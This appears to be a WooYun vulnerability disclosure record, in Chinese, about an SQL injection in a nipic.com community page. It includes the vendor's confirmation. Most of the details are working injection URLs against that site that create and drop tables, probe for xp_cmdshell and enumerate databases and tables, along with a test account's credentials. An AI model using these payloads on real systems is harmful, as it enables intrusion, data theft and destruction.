{"id": 3977, "wybug_id": "wooyun-2014-057006", "wybug_title": "昵图网SQL注入漏洞（可以扫出所有库、表、进行任意表、库的增、删、改）", "wybug_corp": "杭州昵图信息技术有限公司", "wybug_author": "Rain", "wybug_date": "2014-04-14 11:57", "wybug_open_date": "2014-05-29 11:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向公众公开  简要描述： SQL注入 详细说明：  过滤不严，存在SQL注入   漏洞证明：  使用测试账号rainboyhi测试密码rainboyhi登录后访问http://user.nipic.com/club/list.asp?id=12 存在注入//创建一个临时表http://user.nipic.com/club/list.asp?id=12;create table test2 (dstr nvarchar(3000));-- //判断创建是否成功http://user.nipic.com/club/list.asp?id=12 and  exists(select * from test2);-- //测试一下删除表http://user.nipic.com/club/list.asp?id=12;drop table test2;-- 检测XP_CMDSHELL（CMD命令）：http://user.nipic.com/club/list.asp?id=12 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_cmdshell')测试OK检测XP_REGREAD（注册表读取功能）：http://user.nipic.com/club/list.asp?id=12 and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread')测试OK//测试字段数http://user.nipic.com/club/list.asp?id=12 order by 22;-- 总共22个字段//获取所有数据库http://user.nipic.com/club/list.asp?id=12  and 2<1 union select 1,2,3,4,5,name,7,8,9,10, 11,12,13,14,15,16,17,18,19,20,21 from master.dbo.sysdatabases;-- mastertempdbmodelmsdbReportServerReportServerTempDBNipicClubUserLogin\n\nNipicClub库所有表http://user.nipic.com/club/list.asp?id=12  and 2<1 union select id,2,3,4,5,name,7,8,9,10, 11,12,13,14,15,16,17,18,19,20,21 from NipicClub.dbo.sysobjects where xtype='U';-- 所有表az_bbsaz_bbs_goodaz_bbs_resysdiagramstest\n\n   修复方案：  你懂得   版权声明：转载请注明来源 Rain@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-04-14 13:39 厂商回复： 感谢@Rain ，这个是我们老的社区程序 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-29 13:24 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  好    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}